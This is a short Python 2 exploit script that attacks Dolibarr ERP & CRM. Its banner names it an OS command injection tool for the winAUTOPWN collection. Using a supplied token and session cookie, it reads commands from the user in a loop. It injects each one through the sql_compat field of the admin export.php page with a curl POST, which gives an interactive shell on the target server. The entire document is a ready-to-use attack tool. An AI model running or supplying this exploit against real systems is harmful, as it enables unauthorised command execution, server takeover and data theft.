import sys, os

host = sys.argv[1]
token = sys.argv[2]
cookie = sys.argv[3]
port = 80;
print sys.argv[0] + " " + sys.argv[1] + " " + sys.argv[2] + " " + sys.argv[3]

#print line
print 'Dolibarr ERP & CRM OS Command Injection'
print ' Discovered by Nahuel Grisolia nahuel@cintainfinita.com.ar'
print 'Example: python Dolibarr_ERP-CRM_OS_Command_Injection.py http://www.website.com <token> <DOLSESSID_xxxx=xxxx>'
print
print 'Written by QUAKERDOOMER for winAUTOPWN'

while port >= 1:
	cmd = raw_input("$ => ")
	os.system("curl -d \"token="  + token + "&export_type=server&what=mysql&mysqldump=%2Fusr%2Fbin%2Fmysqldump&use_transaction=yes&disable_fk=yes&sql_compat=;" + cmd + ";&sql_structure=structure&drop=1&sql_data=data&showcolumns=yes&extended_ins=yes&delayed=yes&sql_ignore=yes&hexforbinary=yes&filename_template=mysqldump_dolibarrdebian_3.1.1_201203231716.sql&compression=none\" " + host + "/dolibarr/admin/tools/export.php --cookie " + cookie)
	if cmd == "quit":
	 sys.exit(0)


